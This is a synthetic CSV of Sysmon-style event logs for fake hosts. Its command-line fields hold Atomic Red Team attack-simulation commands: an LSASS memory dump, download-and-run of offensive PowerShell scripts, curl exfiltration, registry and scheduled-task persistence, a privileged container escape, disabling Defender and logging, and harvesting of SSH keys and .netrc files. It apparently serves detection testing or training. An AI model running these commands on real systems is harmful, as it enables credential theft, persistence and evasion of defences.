EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
3,Network Connection,lt-34.patel.com,erica09,6757,malware.exe,"""echo '#{text_to_append}' >> /etc/profile\n"",",169825,3c39d5d6-1281-427a-998e-b11296cd7419,8212,explorer.exe,C:\Users\Public\child..exe,7670,backdoor.exe,C:\Program Files\race..exe,2024-05-17T01:36:51.819003Z
5,Process Terminate,srv-90.watson-bolton.com,david87,7803,backdoor.exe,"""echo \""#{script_command}\"" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \""#{script_path}\"" /f\n"",",416562,c9f021b4-ac8e-4110-8e15-f909703d56b9,4586,backdoor.exe,C:\Program Files\easy..exe,7754,powershell.exe,C:\Windows\avoid..dll,2024-05-17T01:36:51.819003Z
3,Network Connection,web-66.garza.com,pvasquez,5630,backdoor.exe,"""netsh advfirewall firewall add rule name=\""Open Port to Any\"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any"",",961569,b5e30544-3879-4712-beb3-b40548588e99,9125,mimikatz.exe,C:\Windows\plan..dll,5824,mimikatz.exe,C:\Program Files\glass..exe,2024-05-17T01:36:51.819003Z
5,Process Terminate,srv-44.davenport.org,ericaphillips,7856,nc.exe,"""#{regsvr32path}\\#{regsvr32name} /s /u /i:\""#{filename}\"" scrobj.dll\n"",",369715,f6717182-65c6-4531-bcc5-17bac2674fbc,8088,taskmgr.exe,C:\Windows\like..dll,1388,backdoor.exe,C:\Users\Public\east..dll,2024-05-17T01:36:51.819003Z
5,Process Terminate,laptop-90.burgess.com,ccoffey,2566,mimikatz.exe,"""kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\""spec\"":{\""hostPID\"": true, \""containers\"":[{\""name\"":\""1\"",\""image\"":\""alpine\"",\""command\"":[\""nsenter\"",\""--mount=/proc/1/ns/mnt\"",\""--\"",\""/bin/bash\""],\""stdin\"": true,\""tty\"":true,\""securityContext\"":{\""privileged\"":true}}]}}'\n"",",410011,67d28715-e1be-4657-b4c7-cb21cd2c944d,7423,cmd.exe,C:\Program Files\brother..dll,5048,cmd.exe,C:\Program Files\size..exe,2024-05-17T01:36:51.820004Z
11,File Create,desktop-07.reyes-smith.biz,espinozajennifer,7043,powershell.exe,"""useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\""ubuntu\""') ]; then echo \""#{username}:#{password}\"" | sudo chpasswd; else echo \""#{password}\"" | passwd --stdin #{username}; fi;\n"",",685787,480ea6cd-cf78-4ee8-9b47-ed5409a80172,9663,taskmgr.exe,C:\Users\Public\up..exe,3351,powershell.exe,C:\Users\Public\throw..exe,2024-05-17T01:36:51.820004Z
7,Image Load,web-78.vaughn-rivas.biz,heather40,7995,cmd.exe,"""wmic #{wmic_command} /FORMAT:\""#{remote_xsl_file}\""\n"",",718487,51fc4759-e9e3-46fd-add0-f3784b5b687c,8496,cmd.exe,C:\Users\Public\senior..exe,4257,malware.exe,C:\Windows\range..dll,2024-05-17T01:36:51.820004Z
11,File Create,laptop-36.cox-robertson.info,erogers,1479,taskmgr.exe,"""reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \""ATOMIC-T1053.005\"" /TR \""cmd /c start /min \\\""\\\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\"" /sc daily /st #{time}\n"",",392318,b703f39e-f73b-4b95-905d-a9f16a0a2dcf,3865,cmd.exe,C:\Program Files\reduce..exe,4465,malware.exe,C:\Windows\color..dll,2024-05-17T01:36:51.820004Z
7,Image Load,desktop-58.pope.com,timothybrewer,5468,explorer.exe,"""xcopy /I /Y \""#{web_shells}\"" #{web_shell_path}\n"",",229182,b1be30d5-20f4-4f57-a315-2c20e86cdcf9,9858,explorer.exe,C:\Windows\seven..exe,3927,taskmgr.exe,C:\Program Files\on..dll,2024-05-17T01:36:51.820004Z
5,Process Terminate,lt-90.davis.net,fgarrison,7488,cmd.exe,"""reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v HideClock /t REG_DWORD /d 1 /f\n"",",154797,47233c9f-69d1-46a2-9b01-209d51410dbb,2571,taskmgr.exe,C:\Windows\machine..exe,5664,regsvr32.exe,C:\Users\Public\do..exe,2024-05-17T01:36:51.821005Z
7,Image Load,web-26.hayden.net,sabrinaherrera,3924,cmd.exe,"""#{msbuildpath}\\#{msbuildname} \""#{filename}\""\n"",",938891,b72e631a-fb95-49eb-bfc6-bfd455dff838,8919,nc.exe,C:\Users\Public\country..dll,4011,malware.exe,C:\Users\Public\little..dll,2024-05-17T01:36:51.821005Z
1,Process Create,email-45.atkinson.com,jennifercarlson,7854,malware.exe,"""REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \""#{thing_to_execute}\""\n"",",375160,38e2eb03-55a1-444a-8f76-863fea54089d,9094,mimikatz.exe,C:\Users\Public\clear..dll,1303,cmd.exe,C:\Users\Public\list..dll,2024-05-17T01:36:51.821005Z
5,Process Terminate,srv-22.warren.info,erica25,4724,backdoor.exe,"""echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n"",",256958,c5f9f581-57b0-41fe-93f1-cf7f233ac46c,9836,explorer.exe,C:\Users\Public\glass..dll,5630,nc.exe,C:\Program Files\way..exe,2024-05-17T01:36:51.821005Z
1,Process Create,desktop-79.wilson-johnson.org,jamesjohnson,4140,backdoor.exe,"""$credFile = \""#{cred_file}\""\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \""#{new_password}\""){\n      Write-Host -ForegroundColor Yellow \""The new password is the same as the password stored in the credential file. Please specify a different new password.\""; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \""Error code: $errCode\""\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\""\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \""Successfully changed the password to #{new_password}\""\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \""#{new_password}\"" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \""You must store the password of the current user by running the prerequisite commands first\""\n}\n"",",765515,e4df0792-809b-4320-b42c-4f8dd69ab45f,2591,cmd.exe,C:\Users\Public\poor..exe,6533,nc.exe,C:\Windows\plan..exe,2024-05-17T01:36:51.821005Z
3,Network Connection,desktop-38.rose.org,daniel33,5227,taskmgr.exe,"""$VM = \""#{vm_name}\""\nNew-VM -Name $VM -Generation 2\nSet-VMFirmware $VM -EnableSecureBoot Off\nStart-VM $VM"",",682924,228eba82-04aa-4b4a-b60a-5386fdd6b797,2549,nc.exe,C:\Users\Public\left..dll,6851,malware.exe,C:\Windows\factor..exe,2024-05-17T01:36:51.821005Z
1,Process Create,web-37.hernandez.biz,mark56,5495,explorer.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \""PathToAtomicsFolder\\..\\ExternalPayloads\\\"" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n"",",864251,2828fbd6-a687-415c-b91d-1033e1c2465d,8883,mimikatz.exe,C:\Program Files\use..exe,2740,regsvr32.exe,C:\Windows\window..dll,2024-05-17T01:36:51.822513Z
5,Process Terminate,desktop-08.kelly.com,meganmiller,1446,regsvr32.exe,"""import -window root #{output_file}\n"",",883076,0ea3f30d-84e3-49a2-9e40-453c5ed9ac90,2137,powershell.exe,C:\Program Files\daughter..exe,6250,backdoor.exe,C:\Program Files\read..dll,2024-05-17T01:36:51.822513Z
3,Network Connection,desktop-15.wilson-long.com,stephaniehodges,1293,taskmgr.exe,"""reg add \""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n"",",955855,001cef5e-eb66-4339-8dc5-0d6097954f36,4764,rundll32.exe,C:\Users\Public\kind..dll,7270,cmd.exe,C:\Users\Public\order..exe,2024-05-17T01:36:51.822513Z
5,Process Terminate,email-53.hall.com,wheelersamantha,5226,mimikatz.exe,"""reg add \""HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \""HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v DefaultPassword /t REG_SZ /d password1 /f\n"",",226779,dd2b231e-7c64-4eb2-b3a2-cacf0e8cb74c,7106,powershell.exe,C:\Users\Public\vote..dll,8873,cmd.exe,C:\Windows\born..dll,2024-05-17T01:36:51.822513Z
7,Image Load,lt-73.fisher-ward.info,josephcunningham,7253,nc.exe,"""kldstat | grep -i \""vmm\""\nkldstat | grep -i \""vbox\""\n"",",312421,b6fbf738-7cce-444e-96bd-2c141bd1c410,2253,regsvr32.exe,C:\Users\Public\enter..dll,3186,regsvr32.exe,C:\Windows\agent..exe,2024-05-17T01:36:51.823523Z
7,Image Load,lt-89.mitchell.net,danielle56,8381,regsvr32.exe,"""ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n"",",649249,9421dcc8-57b2-4627-a822-05bd480fcbff,2319,explorer.exe,C:\Users\Public\relationship..exe,4297,powershell.exe,C:\Program Files\miss..dll,2024-05-17T01:36:51.823523Z
1,Process Create,lt-94.barnett.info,bcrawford,8094,malware.exe,"""reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v NoFileMenu /t REG_DWORD /d 1 /f\n"",",947236,3b9356c6-6375-439a-90e8-38b681ee74f6,2075,backdoor.exe,C:\Windows\three..exe,1009,explorer.exe,C:\Program Files\bill..dll,2024-05-17T01:36:51.823523Z
3,Network Connection,desktop-08.oconnor-smith.net,kelseywilson,9211,malware.exe,"""copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n"",",869778,c5342526-5330-4643-b1db-df5a52117ff5,4475,nc.exe,C:\Users\Public\pattern..exe,9238,mimikatz.exe,C:\Users\Public\keep..dll,2024-05-17T01:36:51.823523Z
1,Process Create,srv-69.watkins.net,bdoyle,5122,powershell.exe,"""aws iam create-user --user-name #{username}\n"",",311584,db30dbfc-71d5-411b-89c9-b5c9546dc7d9,1627,backdoor.exe,C:\Program Files\success..dll,7536,nc.exe,C:\Users\Public\office..dll,2024-05-17T01:36:51.823523Z
3,Network Connection,db-52.schmidt.com,garciaandrew,5200,rundll32.exe,"""Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \""#{password}\"" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""#{username}\"", $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \""#{service_principal_name}\""}\nif ($sp -eq $null) { Write-Warning \""Service Principal not found\""; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \""#{subscription}\""} \nif ($subscription -eq $null) { Write-Warning \""Subscription not found\""; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \""#{role_name}\""}\nif ($role -eq $null) { Write-Warning \""Role not found\""; exit }\n\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \""Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\""\n"",",765494,17f46070-6d7e-410f-9cdd-baecf641e4af,9534,cmd.exe,C:\Users\Public\brother..dll,7227,rundll32.exe,C:\Program Files\set..exe,2024-05-17T01:36:51.824522Z
7,Image Load,laptop-44.mason.com,marisa53,9150,rundll32.exe,"""cat /etc/shells \n"",",206651,cf3f2d24-ee43-4ba5-babd-6bb5d33c87cb,1644,regsvr32.exe,C:\Users\Public\company..exe,6476,explorer.exe,C:\Program Files\provide..exe,2024-05-17T01:36:51.824522Z
3,Network Connection,db-10.harrison-ibarra.net,ana33,7089,mimikatz.exe,"""sysmon -u\n"",",874179,5ab5826d-7237-4c25-8d91-9e1497b35823,3566,powershell.exe,C:\Program Files\research..exe,5545,regsvr32.exe,C:\Program Files\your..dll,2024-05-17T01:36:51.824522Z
11,File Create,desktop-46.wright.com,gfrench,7021,explorer.exe,"""sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n"",",130515,c70c86c4-114b-4b15-a99c-6d17dc375c5a,2685,taskmgr.exe,C:\Windows\team..exe,9349,cmd.exe,C:\Users\Public\bed..exe,2024-05-17T01:36:51.824522Z
1,Process Create,email-86.mathis.com,jcampos,1782,nc.exe,"""for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n"",",573370,812fd648-a65e-468c-a03d-d9c44563b3af,9619,explorer.exe,C:\Program Files\mind..dll,9453,nc.exe,C:\Users\Public\task..exe,2024-05-17T01:36:51.824522Z
5,Process Terminate,db-75.sanders-abbott.com,charlesamy,2476,regsvr32.exe,"""curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n"",",577000,b9e86234-4db5-4ae6-8b0b-5289da708a2e,2406,explorer.exe,C:\Users\Public\note..dll,6371,rundll32.exe,C:\Users\Public\reveal..exe,2024-05-17T01:36:51.825521Z
7,Image Load,web-79.robles-dickerson.com,hunter80,9564,regsvr32.exe,"""mshta.exe \""about:<hta:application><script language=\""VBScript\"">Close(Execute(\""CreateObject(\""\""Wscript.Shell\""\"").Run%20\""\""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}\""\""\""))</script>'\""\n"",",898243,a9ae14d6-9f5d-48f5-be35-d31b98fb653a,3733,cmd.exe,C:\Windows\foot..exe,2771,mimikatz.exe,C:\Users\Public\agreement..dll,2024-05-17T01:36:51.825521Z
11,File Create,laptop-98.burton-mcgrath.com,humphreyyolanda,3446,cmd.exe,"""if [ \""$(uname)\"" = 'FreeBSD' ]; then cmd=\""netstat -Sp tcp\""; else cmd=\""netstat -ant\""; fi;\nif [ -x \""$(command -v arp)\"" ]; then arp -a; else echo \""arp is missing from the machine. skipping...\""; fi;\nif [ -x \""$(command -v ifconfig)\"" ]; then ifconfig; else echo \""ifconfig is missing from the machine. skipping...\""; fi;\nif [ -x \""$(command -v ip)\"" ]; then ip addr; else echo \""ip is missing from the machine. skipping...\""; fi;\nif [ -x \""$(command -v netstat)\"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \""netstat is missing from the machine. skipping...\""; fi;\n"",",782563,33becc27-14e7-4924-a50c-4431e4345f24,6165,malware.exe,C:\Users\Public\production..dll,2996,explorer.exe,C:\Windows\moment..exe,2024-05-17T01:36:51.825521Z
1,Process Create,email-91.moore.biz,npeterson,3353,backdoor.exe,"""pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\n"",",977297,5c886a1a-28b8-43e6-8ee6-de0eb6f2373d,7259,rundll32.exe,C:\Program Files\forward..dll,2575,nc.exe,C:\Users\Public\sign..dll,2024-05-17T01:36:51.825521Z
3,Network Connection,db-01.hansen.com,umelton,9011,malware.exe,"""for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n"",",217375,e14f3ff1-ed8d-436b-ade4-57e794ebcbcc,3525,explorer.exe,C:\Program Files\fund..dll,1493,cmd.exe,C:\Program Files\national..exe,2024-05-17T01:36:51.825521Z
1,Process Create,email-64.chambers-wade.com,browndaniel,1289,powershell.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \""Atomic T1115 Test, grab data from clipboard via VBA\""\nIEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing)\nInvoke-Maldoc -macroFile \""PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\"" -officeProduct \""Word\"" -sub \""GetClipboard\""\n"",",740921,4b1db6e3-5d5e-4b59-b3ea-aa6012b2929f,7714,cmd.exe,C:\Program Files\continue..exe,2994,explorer.exe,C:\Users\Public\reality..exe,2024-05-17T01:36:51.826522Z
3,Network Connection,srv-08.taylor-turner.com,kvargas,8593,rundll32.exe,"""sudo echo osascript -e 'tell app \""Finder\"" to display dialog \""Hello World\""' >> /etc/rc.common\n"",",658214,2751eda5-869d-421f-8de8-51f70ca704bd,4488,nc.exe,C:\Program Files\civil..exe,8893,backdoor.exe,C:\Program Files\leader..exe,2024-05-17T01:36:51.826522Z
11,File Create,db-97.taylor-griffin.com,stacyhoward,6782,mimikatz.exe,"""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  "",",569230,b9320ca7-b6f2-448d-9b1c-3bfcebd52d29,3515,cmd.exe,C:\Users\Public\own..exe,8015,taskmgr.exe,C:\Program Files\mother..exe,2024-05-17T01:36:51.826522Z
1,Process Create,desktop-17.diaz.org,schneiderrachel,4459,explorer.exe,"""ln -sf /dev/null #{history_path}\n"",",971180,1bc38f6f-05f6-4ca8-9df6-a22ba5705efd,2358,powershell.exe,C:\Program Files\system..dll,3323,backdoor.exe,C:\Users\Public\month..exe,2024-05-17T01:36:51.826522Z
1,Process Create,lt-43.gray-lowery.info,petersdavid,8527,backdoor.exe,"""Copy-Item \""$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\"" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item \""$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\"" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb\n"",",153904,9261c44c-c3e5-44de-976a-d73ce2fcefb4,3238,backdoor.exe,C:\Users\Public\wish..exe,1271,regsvr32.exe,C:\Users\Public\final..dll,2024-05-17T01:36:51.827521Z
5,Process Terminate,email-63.ramos-sanders.biz,sandra98,8881,nc.exe,"""export ART='echo \""Atomic Red Team was here... T1059.004\""'\necho $ART |/bin/sh\n"",",704085,f0e73899-9b11-4b3d-999b-ffca6e9cc9ac,2651,mimikatz.exe,C:\Users\Public\network..dll,4563,backdoor.exe,C:\Program Files\marriage..exe,2024-05-17T01:36:51.827521Z
3,Network Connection,srv-33.quinn.com,michaelmorris,3827,malware.exe,"""sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin"",",438073,ea86d648-ea76-44e2-be15-59b0212772e4,4490,taskmgr.exe,C:\Windows\Mr..exe,2053,rundll32.exe,C:\Program Files\which..exe,2024-05-17T01:36:51.827521Z
5,Process Terminate,db-15.richards-hendricks.com,daltonemily,2887,mimikatz.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n"",",775219,1930579a-1c4e-4e55-980f-5725128404f5,8666,taskmgr.exe,C:\Users\Public\again..exe,2468,nc.exe,C:\Program Files\tonight..exe,2024-05-17T01:36:51.827521Z
3,Network Connection,lt-20.lawrence-lester.com,gmartinez,1260,mimikatz.exe,"""sudo tmutil disable"",",455175,e6473529-1408-40a3-adcd-e8580e36e076,1014,regsvr32.exe,C:\Windows\lawyer..exe,9751,powershell.exe,C:\Windows\gun..dll,2024-05-17T01:36:51.827521Z
7,Image Load,desktop-02.sanchez.com,tyler18,5523,taskmgr.exe,"""Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}"",",686335,4aed3ec0-ac48-4830-91ea-85c55d39cf43,5215,malware.exe,C:\Windows\fact..dll,8402,cmd.exe,C:\Program Files\very..dll,2024-05-17T01:36:51.828521Z
11,File Create,desktop-95.barrett-garrett.org,sarah83,9432,cmd.exe,"""New-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" -Name DefaultPassword  -Value password1 -Force\n"",",963858,49632db7-caa8-40d1-b758-d17cf1b691b7,1073,mimikatz.exe,C:\Users\Public\project..dll,4619,malware.exe,C:\Windows\gas..exe,2024-05-17T01:36:51.828521Z
1,Process Create,db-53.duarte-harper.com,gibbsemily,4478,backdoor.exe,"""sudo #{compiled_file} #{source_file}\n"",",564083,f5829595-e28a-4096-ae46-90f4183c8af9,1326,regsvr32.exe,C:\Program Files\cultural..exe,6553,mimikatz.exe,C:\Windows\near..dll,2024-05-17T01:36:51.828521Z
11,File Create,laptop-43.sutton.info,dclark,6998,cmd.exe,"""cmdkey /list\n"",",888993,e4706481-1704-4904-b858-9896163ed491,1871,mimikatz.exe,C:\Program Files\worry..exe,1060,rundll32.exe,C:\Program Files\trouble..dll,2024-05-17T01:36:51.828521Z
11,File Create,db-77.garza.com,wyatt09,4128,cmd.exe,"""mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\n"",",381059,8a03032d-8aea-438b-882b-f279bc4f0b4b,1799,malware.exe,C:\Users\Public\loss..exe,7405,mimikatz.exe,C:\Program Files\hand..dll,2024-05-17T01:36:51.828521Z
5,Process Terminate,laptop-04.gomez-mcgee.com,hmckinney,2498,explorer.exe,"""echo \""block in proto tcp from 1.2.3.4 to any\"" | pfctl -a pf-rules -f -\npfctl -a pf-rules -s rules\n"",",114539,c6a83e50-0977-4218-9031-2be504473cea,7764,nc.exe,C:\Users\Public\yard..exe,9490,backdoor.exe,C:\Program Files\professional..exe,2024-05-17T01:36:51.829521Z
3,Network Connection,lt-71.gomez.biz,lisarhodes,9462,regsvr32.exe,"""echo \""Creating %systemroot%\\wpbbin.exe\""      \nNew-Item -ItemType File -Path \""$env:SystemRoot\\System32\\wpbbin.exe\""\n"",",235432,2c281770-110f-4f19-b8fb-6b0dd4b54319,2363,malware.exe,C:\Windows\already..dll,2436,cmd.exe,C:\Windows\character..dll,2024-05-17T01:36:51.829521Z
11,File Create,web-26.garcia.com,karen37,4735,rundll32.exe,"""reg add \""HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0 /f\n"",",936688,9bdc709c-dec5-4849-96a2-b3104321877a,7242,nc.exe,C:\Windows\face..exe,1307,explorer.exe,C:\Program Files\rule..dll,2024-05-17T01:36:51.829521Z
11,File Create,email-69.wright-johnson.net,johngreen,4320,explorer.exe,"""$syntaxList = #{syntax}\nforeach ($syntax in $syntaxList) {\n#{SharpView} $syntax -}\n"",",622219,263c4fbe-a51e-48e3-b4e2-a57a345ae90f,3395,nc.exe,C:\Program Files\magazine..dll,9619,powershell.exe,C:\Program Files\bad..exe,2024-05-17T01:36:51.829521Z
3,Network Connection,lt-84.ramos.com,kellyturner,2432,nc.exe,"""Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"",",541748,2784c9dd-660e-4c98-918d-6d994ab8fc04,3527,cmd.exe,C:\Users\Public\give..dll,5304,nc.exe,C:\Program Files\account..exe,2024-05-17T01:36:51.829521Z
3,Network Connection,email-69.bennett-prince.com,michaelprice,4597,nc.exe,"""echo \""block in proto tcp from 1.2.3.4 to any\"" | pfctl -a pf-rules -f -\npfctl -a pf-rules -s rules\n"",",627813,50b0e60e-b1e8-47a4-8715-4a4d59b21114,4651,explorer.exe,C:\Windows\capital..exe,7499,regsvr32.exe,C:\Users\Public\lead..exe,2024-05-17T01:36:51.830522Z
7,Image Load,desktop-07.anderson.com,dennisallen,7185,nc.exe,"""if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \""Droplet\\|HVM\\|VirtualBox\\|VMware\""; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \""Xen\\|Bochs\\|QEMU\""; fi\nif [ -x \""$(command -v dmidecode)\"" ]; then sudo dmidecode | grep -i \""microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\""; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \""vmware\\|vbox\""; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \""vmware\\|vbox\\|qemu\\|virtual\""; fi\nif [ -x \""$(command -v lspci)\"" ]; then sudo lspci | grep -i \""vmware\\|virtualbox\""; fi\nif [ -x \""$(command -v lscpu)\"" ]; then sudo lscpu | grep -i \""Xen\\|KVM\\|Microsoft\""; fi\n"",",843819,4e0d3a34-967c-45b7-a96e-d511f372e3ba,5109,regsvr32.exe,C:\Program Files\foreign..exe,3991,backdoor.exe,C:\Program Files\summer..exe,2024-05-17T01:36:51.830522Z
